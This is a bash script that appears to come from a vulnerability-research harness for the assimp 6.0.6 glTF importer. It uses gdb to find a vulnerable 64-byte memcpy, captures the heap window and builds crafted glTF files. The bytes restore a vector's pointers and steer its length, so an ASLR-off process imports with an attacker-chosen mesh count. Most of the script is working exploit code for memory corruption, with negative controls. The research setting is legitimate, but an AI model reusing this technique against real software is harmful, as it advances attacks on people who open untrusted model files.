#!/usr/bin/env bash
# W20: clean-import control in a PLAIN process, with no debugger attached.
#
# W18/W19 calibrated a crafted glTF document under gdb with ASLR off and then
# observed scene=ok only while gdb was attached. Here the same 64-byte
# destination window is discovered and captured under gdb, written back into
# the document, and the resulting static files are run with `setarch -R` and
# NO gdb. Prediction: the crafted bytes alone restore the live meshes vector
# and steer its size, so the plain importer exits 0 with scene=ok and the
# chosen mesh count, while the unfixed W14 document still aborts.
#
# ASLR-off is a stated condition; the plain ASLR-on run is a negative. This
# is pointer/length data integrity, NOT code control or r5.
set -euo pipefail
cd "$(dirname "$0")/.."

src=pins/assimp-6.0.6
driver=harness/bin/w12_o2
if [ ! -x "$driver" ]; then
    bash harness/run-w12.sh >/dev/null
fi
mkdir -p w20/evidence
trace=w20/evidence/w20.trace
log=w20/evidence/w20.log
: >"$trace"
: >"$log"

pass=0
fail=0
check() { # name, required substring
    if grep -qF -- "$2" "$trace"; then
        printf 'PASS %s\n' "$1" | tee -a "$log"
        pass=$((pass + 1))
    else
        printf 'FAIL %s (missing: %s)\n' "$1" "$2" | tee -a "$log"
        fail=$((fail + 1))
    fi
}

sha256sum "$src/code/AssetLib/glTF/glTFAsset.inl" \
          "$src/code/AssetLib/glTF/glTFImporter.cpp" >w20/evidence/source-hashes.out
cat w20/evidence/source-hashes.out >>"$trace"

# The base document length matters: heap placement depends on the input size.
python3 - <<'PY' >>"$trace"
import json, pathlib
d = json.loads(pathlib.Path('harness/cases/idxptr-zero.gltf').read_text())
p = pathlib.Path('w20/evidence/base.gltf')
p.write_text(json.dumps(d, indent=2))
print('BASE bytes=%d' % p.stat().st_size)
PY

pre_bp="$PWD/$src/code/AssetLib/glTF/glTFImporter.cpp:314"
for i in 1 2; do
    gdb -q -batch -ex 'set disable-randomization on' -ex 'set breakpoint pending on' \
        -ex "break $pre_bp" -ex run \
        -ex 'print/x meshes._M_impl._M_start' \
        -ex 'print/x meshes._M_impl._M_finish' \
        -ex 'print/x meshes._M_impl._M_end_of_storage' \
        --args "$driver" w20/evidence/base.gltf \
        >"w20/evidence/own-$i.out" 2>&1 || true
done
python3 - <<'PY' >w20/evidence/calibration.out
import pathlib, re
def vals(p):
    out = {}
    for line in pathlib.Path(p).read_text().splitlines():
        m = re.match(r'^\$(\d+) = (.*)$', line)
        if m:
            out[m.group(1)] = m.group(2)
    return out
a, b = vals('w20/evidence/own-1.out'), vals('w20/evidence/own-2.out')
assert a == b, f'calibration unstable: {a} vs {b}'
print('CAL own_begin=%s own_finish=%s own_cap=%s stable=1' % (a['1'], a['2'], a['3']))
PY
cat w20/evidence/calibration.out >>"$trace"
own_begin=$(python3 -c "print('$(cat w20/evidence/calibration.out)'.split()[1].split('=')[1])")

# Discover the vulnerable destination at the last 64-byte memcpy, not from
# the vector address: the offset varies with driver path and environment.
cat >w20/evidence/discover.gdb <<'GDB'
set disable-randomization on
start
break memcpy@plt if $rdx == 64
commands
silent
printf "DST=%p SRC=%p N=%lu\n", $rdi, $rsi, $rdx
continue
end
continue
GDB
gdb -q -batch -x w20/evidence/discover.gdb --args "$driver" w20/evidence/base.gltf \
    >w20/evidence/discover.out 2>&1 || true
dest=$(grep '^DST=' w20/evidence/discover.out | tail -1 | awk '{print $1}' | cut -d= -f2)
if [ -z "$dest" ]; then
    echo 'FAIL no 64-byte memcpy destination discovered' | tee -a "$log"
    exit 1
fi
printf 'DISC dest=%s\n' "$dest" >>"$trace"

# Capture at the call site: a window taken earlier at :314 is stale in two
# bytes and yields a corrupt-pointer abort (preserved negative in W19).
gdb -q -batch -ex 'set disable-randomization on' -ex start \
    -ex "break memcpy@plt if \$rdi == $dest && \$rdx == 64" \
    -ex continue -ex 'printf "DST=%p SRC=%p N=%lu\n", $rdi, $rsi, $rdx' \
    -ex 'x/64bx $rdi' --args "$driver" w20/evidence/base.gltf \
    >w20/evidence/window-gdb.out 2>&1 || true
python3 - "$own_begin" <<'PY' >w20/evidence/window.out
import hashlib, pathlib, re, sys
own = int(sys.argv[1], 16)
t = pathlib.Path('w20/evidence/window-gdb.out').read_text()
assert 'DST=' in t, 'vulnerable memcpy was not reached'
rows = [l for l in t.splitlines() if re.match(r'^0x[0-9a-f]+:\s', l)]
assert rows, 'no window dump'
bs = []
for l in rows:
    bs += [int(x, 16) for x in re.findall(r'\b0x([0-9a-f]{2})\b', l)]
assert len(bs) == 64, f'expected 64 bytes, got {len(bs)}'
win = bytes(bs)
low = int.from_bytes(win[12:16], 'little')
assert low == (own & 0xffffffff), f'window begin low {low:#x} != own {own:#x}'
pathlib.Path('w20/evidence/window.hex').write_text(win.hex() + '\n')
print('WIN bytes=64 sha256=%s begin=%s finish=%s cap=%s begin_low_matches_own=1' % (
    hashlib.sha256(win).hexdigest(), win[12:20].hex(), win[20:28].hex(),
    win[28:36].hex()))
PY
cat w20/evidence/window.out >>"$trace"
grep -m1 '^DST=' w20/evidence/window-gdb.out >>"$trace" || true

# Static documents: restore the whole captured window, change only the
# finish low word (window offset 20..23, document bytes 56..59). Input
# length is unchanged so the measured window stays the right one.
python3 - <<'PY'
import base64, json, pathlib
win = bytearray.fromhex(pathlib.Path('w20/evidence/window.hex').read_text().strip())
d0 = pathlib.Path('w20/evidence/base.gltf').read_text()
obj0 = json.loads(d0)
prefix, b64 = obj0['buffers']['buf']['uri'].split('base64,', 1)
buf0 = bytearray(base64.b64decode(b64))
for n in (0, 1, 2, 3):
    w = bytearray(win)
    w[20:24] = (int.from_bytes(win[12:16], 'little') + n * 8).to_bytes(4, 'little')
    b = bytearray(buf0)
    b[36:100] = w
    d = json.loads(d0)
    d['buffers']['buf']['uri'] = prefix + 'base64,' + base64.b64encode(bytes(b)).decode()
    p = pathlib.Path('w20/evidence/len%d.gltf' % n)
    p.write_text(json.dumps(d, indent=2))
    assert p.stat().st_size == len(d0), (n, p.stat().st_size, len(d0))
PY
# The actual claim: plain ASLR-off execution, no debugger, static file only.
for n in 0 1 2 3; do
    rc=0
    setarch x86_64 -R "$driver" "w20/evidence/len$n.gltf" \
        >"w20/evidence/plain-len$n.out" 2>&1 || rc=$?
    scene=$(grep -m1 -o 'scene=ok' "w20/evidence/plain-len$n.out" || true)
    scene=${scene#scene=}
    meshes=$(sed -n 's/^meshes=//p' "w20/evidence/plain-len$n.out" | head -1 || true)
    printf 'PLAIN n=%s rc=%s scene=%s meshes=%s\n' "$n" "$rc" "${scene:-BAD}" "${meshes:-NONE}" >>"$trace"
done

rc=0
setarch x86_64 -R "$driver" harness/cases/idxptr-mat2-real.gltf \
    >w20/evidence/real.out 2>&1 || rc=$?
if [ "$rc" -ne 0 ] && ! grep -q 'scene=ok' w20/evidence/real.out; then
    printf 'NEG real aborted=1 rc=%s\n' "$rc" >>"$trace"
else
    printf 'NEG real aborted=0 rc=%s\n' "$rc" >>"$trace"
fi

rc=0
"$driver" w20/evidence/len3.gltf >w20/evidence/aslr-on.out 2>&1 || rc=$?
if [ "$rc" -ne 0 ]; then
    printf 'NEG aslr_on faulted=1 rc=%s\n' "$rc" >>"$trace"
else
    printf 'NEG aslr_on faulted=0 rc=%s\n' "$rc" >>"$trace"
fi

check 'source hashes pinned' 'glTFAsset.inl'
check 'calibration stable across two measurements' 'stable=1'
check 'captured window matches own begin' 'begin_low_matches_own=1'
check 'plain no-debugger len0 clean import' 'PLAIN n=0 rc=0 scene=ok meshes=0'
check 'plain no-debugger len1 clean import' 'PLAIN n=1 rc=0 scene=ok meshes=1'
check 'plain no-debugger len2 clean import' 'PLAIN n=2 rc=0 scene=ok meshes=2'
check 'plain no-debugger len3 clean import' 'PLAIN n=3 rc=0 scene=ok meshes=3'
check 'W14 real document still aborts' 'NEG real aborted=1'
check 'plain ASLR-on run is a negative' 'NEG aslr_on faulted=1'

printf 'TOTAL pass=%d fail=%d\n' "$pass" "$fail" >>"$trace"
sha256sum "$trace" >w20/evidence/w20.trace.sha256
cat "$trace"
[ "$fail" -eq 0 ]
